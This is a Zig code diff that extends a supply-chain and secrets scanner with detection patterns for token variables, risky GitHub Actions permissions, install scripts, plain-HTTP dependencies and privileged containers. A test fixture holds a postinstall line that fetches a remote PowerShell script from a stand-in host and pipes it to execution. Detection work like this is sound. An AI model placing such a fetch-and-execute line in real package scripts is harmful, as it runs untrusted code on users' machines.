@@ -31,6 +31,7 @@ pub fn scanSource(allocator: std.mem.Allocator, source: []const u8, options: Sca
         const line = std.mem.trim(u8, raw_line, "\r");
         try scanGenericLine(&collection, options.path, line, line_number);
         try scanLanguageLine(&collection, options, line, line_number);
+        try scanPathSpecificLine(&collection, options.path, line, line_number);
     }
 
     return collection;
@@ -38,8 +39,13 @@ pub fn scanSource(allocator: std.mem.Allocator, source: []const u8, options: Sca
 
 fn scanGenericLine(collection: *findings.Collection, path: []const u8, line: []const u8, line_number: usize) !void {
     try detectSecret(collection, path, line, line_number, "PRIVATE KEY", .critical, "private key material appears in workspace text");
+    try detectSecret(collection, path, line, line_number, "-----BEGIN", .critical, "PEM-like private material appears in workspace text");
     try detectSecret(collection, path, line, line_number, "AWS_SECRET_ACCESS_KEY", .critical, "AWS secret key appears in workspace text");
     try detectSecret(collection, path, line, line_number, "GITHUB_TOKEN", .high, "GitHub token-like variable appears in workspace text");
+    try detectSecret(collection, path, line, line_number, "NPM_TOKEN", .high, "npm token-like variable appears in workspace text");
+    try detectSecret(collection, path, line, line_number, "OPENAI_API_KEY", .high, "OpenAI API key-like variable appears in workspace text");
+    try detectSecret(collection, path, line, line_number, "SLACK_BOT_TOKEN", .high, "Slack token-like variable appears in workspace text");
+    try detectSecret(collection, path, line, line_number, "DATABASE_URL=", .medium, "database connection string appears in workspace text");
     try detectSecret(collection, path, line, line_number, "api_key", .high, "API key-like assignment appears in workspace text");
     try detectSecret(collection, path, line, line_number, "password=", .high, "password-like assignment appears in workspace text");
     try detectSecret(collection, path, line, line_number, "token=", .medium, "token-like assignment appears in workspace text");
@@ -110,16 +116,89 @@ fn scanLanguageLine(collection: *findings.Collection, options: ScanOptions, line
         .yaml => {
             if (indexOfIgnoreCase(path, ".github") != null) {
                 try detect(collection, path, line, line_number, "pull_request_target", .high, "GitHub Actions pull_request_target expands trust boundary");
+                try detect(collection, path, line, line_number, "workflow_run", .medium, "GitHub Actions workflow_run chains trust from another workflow");
                 try detect(collection, path, line, line_number, "permissions: write-all", .high, "GitHub Actions grants broad write permissions");
                 try detect(collection, path, line, line_number, "id-token: write", .high, "GitHub Actions can mint OIDC tokens for external cloud trust");
                 try detect(collection, path, line, line_number, "contents: write", .medium, "GitHub Actions can write repository contents");
+                try detect(collection, path, line, line_number, "actions: write", .medium, "GitHub Actions can modify workflow runs or artifacts");
+                try detect(collection, path, line, line_number, "pull-requests: write", .medium, "GitHub Actions can write pull request metadata");
+                try detect(collection, path, line, line_number, "packages: write", .medium, "GitHub Actions can publish packages");
+                try detect(collection, path, line, line_number, "deployments: write", .medium, "GitHub Actions can create deployments");
+                try detect(collection, path, line, line_number, "secrets: inherit", .high, "reusable workflow inherits caller secrets");
                 try detect(collection, path, line, line_number, "persist-credentials: true", .medium, "checkout persists repository credentials into the workflow workspace");
                 try detect(collection, path, line, line_number, "self-hosted", .high, "workflow targets a self-hosted runner trust boundary");
+                try detect(collection, path, line, line_number, "ACTIONS_ALLOW_UNSECURE_COMMANDS", .high, "workflow enables deprecated insecure command channel");
+                try detect(collection, path, line, line_number, "github.event.pull_request.head", .high, "workflow references untrusted pull request head context");
                 try detectUnpinnedActionUse(collection, path, line, line_number);
             }
         },
         else => {},
     }
+}
+
+fn scanPathSpecificLine(collection: *findings.Collection, path: []const u8, line: []const u8, line_number: usize) !void {
+    const base = std.fs.path.basename(path);
+    if (std.mem.eql(u8, base, "package.json")) {
+        try scanPackageJsonLine(collection, path, line, line_number);
+    } else if (std.mem.eql(u8, base, "requirements.txt")) {
+        try scanRequirementsLine(collection, path, line, line_number);
+    } else if (std.mem.eql(u8, base, "Gemfile")) {
+        try scanGemfileLine(collection, path, line, line_number);
+    } else if (std.mem.eql(u8, base, "composer.json")) {
+        try scanComposerJsonLine(collection, path, line, line_number);
+    } else if (std.mem.eql(u8, base, "pom.xml") or std.mem.eql(u8, base, "build.gradle") or std.mem.eql(u8, base, "build.gradle.kts")) {
+        try scanJvmBuildLine(collection, path, line, line_number);
+    } else if (std.mem.eql(u8, base, "docker-compose.yml") or std.mem.eql(u8, base, "docker-compose.yaml") or std.mem.eql(u8, base, "compose.yml") or std.mem.eql(u8, base, "compose.yaml")) {
+        try scanComposeLine(collection, path, line, line_number);
+    }
+}
+
+fn scanPackageJsonLine(collection: *findings.Collection, path: []const u8, line: []const u8, line_number: usize) !void {
+    try detectJsonKey(collection, path, line, line_number, "preinstall", .high, "package lifecycle script runs before dependency install");
+    try detectJsonKey(collection, path, line, line_number, "install", .medium, "package install script runs during dependency install");
+    try detectJsonKey(collection, path, line, line_number, "postinstall", .high, "package lifecycle script runs after dependency install");
+    try detectJsonKey(collection, path, line, line_number, "prepare", .medium, "package prepare script can run during install or publish");
+    try detectJsonKey(collection, path, line, line_number, "prepublish", .medium, "package publish lifecycle script should be reviewed");
+    try detect(collection, path, line, line_number, "node-gyp rebuild", .medium, "package script compiles native code during install");
+    try detect(collection, path, line, line_number, "curl ", .medium, "package script downloads remote content");
+    try detect(collection, path, line, line_number, "wget ", .medium, "package script downloads remote content");
+    try detect(collection, path, line, line_number, "powershell", .high, "package script invokes PowerShell");
+    try detect(collection, path, line, line_number, "cmd /c", .high, "package script invokes cmd.exe");
+}
+
+fn scanRequirementsLine(collection: *findings.Collection, path: []const u8, line: []const u8, line_number: usize) !void {
+    try detect(collection, path, line, line_number, "git+http://", .high, "Python dependency uses unauthenticated git transport");
+    try detect(collection, path, line, line_number, "http://", .medium, "Python dependency uses plain HTTP");
+    try detect(collection, path, line, line_number, "--trusted-host", .medium, "pip trusted-host disables TLS hostname trust");
+    try detect(collection, path, line, line_number, "--extra-index-url", .medium, "extra package index can change dependency trust");
+    try detect(collection, path, line, line_number, "-e git+", .medium, "editable VCS dependency should be reviewed");
+}
+
+fn scanGemfileLine(collection: *findings.Collection, path: []const u8, line: []const u8, line_number: usize) !void {
+    try detect(collection, path, line, line_number, "http://", .medium, "Ruby dependency source uses plain HTTP");
+    try detect(collection, path, line, line_number, "git:", .medium, "Ruby git dependency should be reviewed");
+}
+
+fn scanComposerJsonLine(collection: *findings.Collection, path: []const u8, line: []const u8, line_number: usize) !void {
+    try detectJsonKey(collection, path, line, line_number, "post-install-cmd", .high, "Composer lifecycle script runs after install");
+    try detectJsonKey(collection, path, line, line_number, "post-update-cmd", .high, "Composer lifecycle script runs after update");
+    try detect(collection, path, line, line_number, "http://", .medium, "Composer dependency source uses plain HTTP");
+}
+
+fn scanJvmBuildLine(collection: *findings.Collection, path: []const u8, line: []const u8, line_number: usize) !void {
+    try detect(collection, path, line, line_number, "http://", .medium, "JVM build dependency source uses plain HTTP");
+    try detect(collection, path, line, line_number, "mavenLocal()", .medium, "JVM build reads mutable local Maven artifacts");
+    try detect(collection, path, line, line_number, "exec {", .high, "JVM build executes a local process");
+    try detect(collection, path, line, line_number, "<exec", .high, "Maven build executes a local process");
+}
+
+fn scanComposeLine(collection: *findings.Collection, path: []const u8, line: []const u8, line_number: usize) !void {
+    try detect(collection, path, line, line_number, "privileged: true", .high, "compose service runs privileged");
+    try detect(collection, path, line, line_number, "network_mode: host", .high, "compose service uses host networking");
+    try detect(collection, path, line, line_number, "pid: host", .high, "compose service joins host PID namespace");
+    try detect(collection, path, line, line_number, "/var/run/docker.sock", .critical, "compose mounts Docker socket into a container");
+    try detect(collection, path, line, line_number, "SYS_ADMIN", .high, "compose grants SYS_ADMIN capability");
+    try detect(collection, path, line, line_number, "cap_add:", .medium, "compose grants extra Linux capabilities");
 }
 
 fn detect(
@@ -134,6 +213,27 @@ fn detect(
     if (indexOfIgnoreCase(line, needle)) |column| {
         try collection.append(.polyglot_trust, risk, path, line_number, column, message, line);
     }
+}
+
+fn detectJsonKey(
+    collection: *findings.Collection,
+    path: []const u8,
+    line: []const u8,
+    line_number: usize,
+    comptime key: []const u8,
+    risk: findings.Risk,
+    message: []const u8,
+) !void {
+    if (jsonKeyColumn(line, key)) |column| {
+        try collection.append(.polyglot_trust, risk, path, line_number, column, message, line);
+    }
+}
+
+fn jsonKeyColumn(line: []const u8, comptime key: []const u8) ?usize {
+    const quoted = "\"" ++ key ++ "\"";
+    const column = indexOfIgnoreCase(line, quoted) orelse return null;
+    if (std.mem.indexOfScalar(u8, line[column + quoted.len ..], ':') == null) return null;
+    return column;
 }
 
 fn detectSecret(
@@ -154,7 +254,13 @@ fn detectUnpinnedActionUse(collection: *findings.Collection, path: []const u8, l
     const uses_at = indexOfIgnoreCase(line, "uses:") orelse return;
     var value = std.mem.trim(u8, line[uses_at + "uses:".len ..], " \t'\"");
     if (value.len == 0) return;
-    if (startsWithIgnoreCase(value, "./") or startsWithIgnoreCase(value, "../") or startsWithIgnoreCase(value, "docker://")) return;
+    if (startsWithIgnoreCase(value, "./") or startsWithIgnoreCase(value, "../")) return;
+    if (startsWithIgnoreCase(value, "docker://")) {
+        if (std.mem.indexOf(u8, value, "@sha256:") == null) {
+            try collection.append(.polyglot_trust, .medium, path, line_number, uses_at, "Docker-based GitHub Action is not pinned by image digest", line);
+        }
+        return;
+    }
 
     const at = std.mem.indexOfScalar(u8, value, '@') orelse {
         try collection.append(.polyglot_trust, .medium, path, line_number, uses_at, "GitHub Action reference is not pinned to a version or commit", line);
@@ -207,6 +313,29 @@ test "polyglot scanner detects script execution boundaries" {
     try std.testing.expect(collection.countRiskAtLeast(.high) >= 3);
 }
 
+test "polyglot scanner detects package and dependency trust edges" {
+    var npm = try scanSource(std.testing.allocator,
+        \\"scripts": {
+        \\  "postinstall": "powershell -c iwr https://example.test/i.ps1 | iex",
+        \\  "install": "node-gyp rebuild"
+        \\}
+        \\
+    , .{ .path = "package.json", .language = .json });
+    defer npm.deinit();
+    try std.testing.expect(npm.countRiskAtLeast(.high) >= 2);
+    try std.testing.expect(npm.countRiskAtLeast(.medium) >= 1);
+
+    var pip = try scanSource(std.testing.allocator,
+        \\--trusted-host example.test
+        \\--extra-index-url http://packages.example.test/simple
+        \\-e git+http://example.test/project.git
+        \\
+    , .{ .path = "requirements.txt", .language = .text });
+    defer pip.deinit();
+    try std.testing.expect(pip.countRiskAtLeast(.high) >= 1);
+    try std.testing.expect(pip.countRiskAtLeast(.medium) >= 2);
+}
+
 test "polyglot scanner detects native and secret boundaries" {
     var collection = try scanSource(std.testing.allocator,
         \\const char* token = "AWS_SECRET_ACCESS_KEY";
@@ -231,6 +360,7 @@ test "polyglot scanner detects GitHub Actions trust edges" {
         \\      contents: write
         \\    steps:
         \\      - uses: actions/checkout@v4
+        \\      - uses: docker://alpine:latest
         \\        with:
         \\          persist-credentials: true
         \\
@@ -239,4 +369,22 @@ test "polyglot scanner detects GitHub Actions trust edges" {
 
     try std.testing.expect(collection.countRiskAtLeast(.high) >= 4);
     try std.testing.expect(collection.countRiskAtLeast(.medium) >= 3);
+}
+
+test "polyglot scanner detects compose container breakouts" {
+    var collection = try scanSource(std.testing.allocator,
+        \\services:
+        \\  app:
+        \\    privileged: true
+        \\    network_mode: host
+        \\    volumes:
+        \\      - /var/run/docker.sock:/var/run/docker.sock
+        \\    cap_add:
+        \\      - SYS_ADMIN
+        \\
+    , .{ .path = "docker-compose.yml", .language = .yaml });
+    defer collection.deinit();
+
+    try std.testing.expect(collection.countRiskAtLeast(.critical) >= 1);
+    try std.testing.expect(collection.countRiskAtLeast(.high) >= 4);
 }
